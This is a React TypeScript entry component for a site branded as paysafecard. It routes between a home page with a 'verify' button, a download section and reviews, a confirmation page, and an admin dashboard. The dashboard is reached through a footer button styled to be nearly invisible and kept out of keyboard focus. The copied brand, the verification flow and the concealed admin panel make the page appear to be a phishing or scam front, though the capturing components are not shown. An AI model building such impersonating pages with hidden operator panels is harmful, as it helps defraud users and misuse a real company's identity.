import { useState, useEffect } from "react";
import HeroSection from "./components/HeroSection";
import DownloadSection from "./components/DownloadSection";
import ReviewsSection from "./components/ReviewsSection";
import ConfirmationPage from "./components/ConfirmationPage";
import AdminDashboard from "./components/AdminDashboard";

type Page = "home" | "confirmation" | "admin";

export default function App() {
  const [page, setPage] = useState<Page>("home");

  // Check URL hash for /admin route
  useEffect(() => {
    const checkHash = () => {
      if (window.location.hash === "#/admin") {
        setPage("admin");
      }
    };
    checkHash();
    window.addEventListener("hashchange", checkHash);
    return () => window.removeEventListener("hashchange", checkHash);
  }, []);

  if (page === "admin") {
    return (
      <AdminDashboard
        onBack={() => {
          window.location.hash = "";
          setPage("home");
        }}
      />
    );
  }

  if (page === "confirmation") {
    return <ConfirmationPage onNewVerification={() => setPage("home")} />;
  }

  return (
    <div className="min-h-screen bg-white text-slate-900 font-sans antialiased">

      <main>
        <HeroSection onVerify={() => setPage("confirmation")} />
        <div id="download">
          <DownloadSection />
        </div>
        <div id="reviews">
          <ReviewsSection />
        </div>
      </main>

      <footer
        className="py-6 text-center text-white/70 text-xs relative"
        style={{ backgroundColor: "#04267f" }}
      >
        © {new Date().getFullYear()} paysafecard. All rights reserved.
        <button
          onClick={() => { window.location.hash = "#/admin"; setPage("admin"); }}
          className="absolute right-3 bottom-2 opacity-[0.08] hover:opacity-30 transition-opacity duration-500 text-white text-[8px] cursor-default select-none"
          style={{ background: "none", border: "none", padding: "4px 6px" }}
          aria-label="Admin"
          tabIndex={-1}
        >
          ●
        </button>
      </footer>
    </div>
  );
}
